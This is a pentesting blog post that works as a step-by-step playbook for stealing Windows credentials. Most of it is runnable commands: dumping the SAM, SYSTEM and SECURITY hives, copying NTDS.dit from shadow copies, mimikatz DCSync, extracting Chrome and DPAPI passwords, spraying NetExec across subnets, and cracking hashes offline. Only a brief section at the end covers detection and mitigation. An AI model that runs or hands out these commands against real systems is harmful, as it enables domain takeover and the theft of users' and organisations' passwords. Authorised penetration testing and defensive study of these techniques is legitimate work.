---
layout: post
title: "Critical Windows Files Every Pentester Should Know"
category: "Windows Security"
date: 2025-11-15
readTime: "14 min"
tags: [windows, active-directory, ntds, sam, netexec]
excerpt: "The files that matter in Windows hacking: SAM, NTDS.dit, LSA Secrets, and DPAPI. Plus how to dump them remotely with NetExec."
---

# Critical Windows Files Every Pentester Should Know

When you're attacking Windows, certain files are gold mines. Here's what to look for and how to extract them.

## SAM - Local Password Hashes

**What:** Security Account Manager - stores local user password hashes

**Where:** `C:\Windows\System32\config\SAM`

**Why it matters:** Get this + SYSTEM hive = you can crack or pass-the-hash all local accounts.

### Extracting SAM

```cmd
# Method 1: reg.exe (need admin)
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system

# Method 2: Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

### Decrypting

```bash
# On your Kali
secretsdump.py -sam sam -system system LOCAL

# Output:
# Administrator:500:aad3b435...:fc525c96...::: 
# user:1001:aad3b435...:8846f7ea...::: 
```

### Cracking

```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
```

## NTDS.dit - The Holy Grail

**What:** Active Directory database containing EVERY domain credential

**Where:** `C:\Windows\NTDS\ntds.dit` (on Domain Controllers)

**Why it matters:** This is the crown jewel. Get this file = you own the entire domain.

### What's Inside

- Every user's password hash
- Every computer account hash
- Group memberships
- The krbtgt hash (for Golden Tickets)
- Literally everything

### Extracting

```cmd
# Volume Shadow Copy (most common)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\temp\

# ntdsutil (official MS tool)
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```

### Dumping All Hashes

```bash
secretsdump.py -ntds ntds.dit -system system LOCAL -outputfile domain

# Outputs every single domain credential
# Administrator:500:aad3b...:fc525...::: 
# krbtgt:502:aad3b...:1a2b3c...::: 
# ...thousands more...
```

### DCSync (No File Needed)

```cmd
# Mimikatz method - impersonate DC
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

Pulls hashes directly via replication. No file extraction needed.

## LSA Secrets - Service Account Passwords

**What:** Stored secrets in the SECURITY hive

**Where:** `C:\Windows\System32\config\SECURITY`

**Why it matters:** Contains service account passwords in **cleartext**, auto-logon creds, and more.

### What You'll Find

- Service account passwords (SQL Server, IIS, etc.)
- Scheduled task credentials
- Auto-logon passwords
- DPAPI master keys

### Dumping

```bash
secretsdump.py -security security -system system LOCAL

# Example output:
# [*] _SC_MSSQLSERVER
# DOMAIN\svc-sql:MyP@ssw0rd123!
#
# [*] DefaultPassword  
# AdminPassword:Welcome2023!
```

Boom, cleartext passwords.

## DPAPI - Application Secrets

**What:** Data Protection API - encrypts user secrets

**Protects:**
- Chrome/Edge saved passwords
- Windows Credential Manager
- WiFi passwords
- RDP credentials

**Location:** `C:\Users\<user>\AppData\Roaming\Microsoft\Protect\`

### Extracting DPAPI Secrets

```cmd
# Chrome passwords
SharpChrome.exe logins

# Credential Manager
SharpDPAPI.exe credentials

# Everything
SharpDPAPI.exe machinetriage
```

## NetExec - Remote Credential Dumping

**NetExec** (formerly CrackMapExec) is your best friend for remote attacks.

### Install

```bash
pipx install netexec
```

### Remote SAM Dump

```bash
# With password
netexec smb 10.10.10.100 -u Administrator -p 'Password123' --sam

# Pass-the-Hash
netexec smb 10.10.10.100 -u Administrator -H 'aad3b...:fc525...' --sam

# Spray across network
netexec smb 192.168.1.0/24 -u admin -p password --sam
```

### Remote LSA Dump

```bash
netexec smb 10.10.10.100 -u admin -p password --lsa

# Often reveals service account passwords in cleartext
```

### NTDS from DC

```bash
# Extract entire NTDS.dit remotely
netexec smb 10.10.10.50 -u Administrator -p password --ntds

# Just specific users
netexec smb DC01 -u admin -p pass --ntds --users
```

### Network-Wide Domination

```bash
# Scan, dump, pwn everything
netexec smb targets.txt -u Administrator -H hash --sam --lsa --shares

# Find where you're admin
netexec smb 192.168.1.0/24 -u admin -p password --shares
```

## Complete Attack Workflow

### Scenario: Domain Controller Access

```bash
# 1. Get on DC via WMI/RDP/whatever
evil-winrm -i DC01 -u admin -p password

# 2. Create VSS
vssadmin create shadow /for=C:

# 3. Copy files
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# 4. Exfiltrate (SMB, HTTP, whatever)
# Transfer to your Kali

# 5. Extract all domain hashes
secretsdump.py -ntds ntds.dit -system system LOCAL -outputfile domain_hashes

# 6. Crack offline
hashcat -m 1000 domain_hashes.ntds rockyou.txt -r rules/best64.rule
```

### Scenario: Workstation Owned

```bash
# 1. Dump local
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
reg save HKLM\SECURITY security

# 2. Extract
secretsdump.py -sam sam -system system LOCAL
secretsdump.py -security security -system system LOCAL

# 3. Dump DPAPI
SharpDPAPI.exe machinetriage
```

### Scenario: No Shell, Just Creds

```bash
# Use NetExec
netexec smb 192.168.1.0/24 -u admin -p password --sam --lsa --ntds
```

## Quick Reference

| File | Contains | Command |
|------|----------|---------|
| **SAM** | Local user hashes | `secretsdump.py -sam sam -system system LOCAL` |
| **NTDS.dit** | All domain hashes | `secretsdump.py -ntds ntds.dit -system system LOCAL` |
| **SECURITY** | LSA secrets (cleartext!) | `secretsdump.py -security security -system system LOCAL` |
| **DPAPI** | App passwords | `SharpDPAPI.exe machinetriage` |

## Tools You Need

- **secretsdump.py** (Impacket) - Offline extraction
- **NetExec** - Remote dumping
- **mimikatz** - Memory attacks, DCSync
- **SharpDPAPI** - DPAPI secrets
- **hashcat** - Cracking

## Defense Notes

These attacks work because:
- Local admin = game over (SAM, LSA)
- Domain admin = total domain compromise (NTDS)
- Default configs expose these files

Mitigations:
- Enable Credential Guard
- Monitor VSS creation (`vssadmin`)
- Alert on `reg.exe save`
- Restrict DA access to DCs only
- Rotate krbtgt regularly

## Wrap Up

The files:
- **SAM** = local machine
- **NTDS.dit** = entire domain
- **LSA Secrets** = service passwords
- **DPAPI** = user app secrets

The tools:
- **secretsdump** = offline
- **NetExec** = remote
- **mimikatz** = advanced

Get these, you own the network.
